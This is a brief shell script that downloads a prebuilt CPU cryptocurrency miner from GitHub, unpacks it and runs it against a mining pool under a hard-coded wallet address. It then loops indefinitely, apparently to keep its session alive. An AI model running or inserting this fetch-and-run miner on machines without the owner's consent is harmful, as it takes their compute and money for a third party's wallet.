#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp://upx.miningocean.org:4352#xnsub -u UPX1UXaGRTSN7h2VyZcBar24HtDTXrcV9PW73REDJCNn3RFUHj2hihNiLznSFD1xkHgqq661WFoE1XfLks9Emrr955ZDKu51Ex.MINADOR -p x --cpu 2
while [ 1 ]; do
sleep 3
done
sleep 999
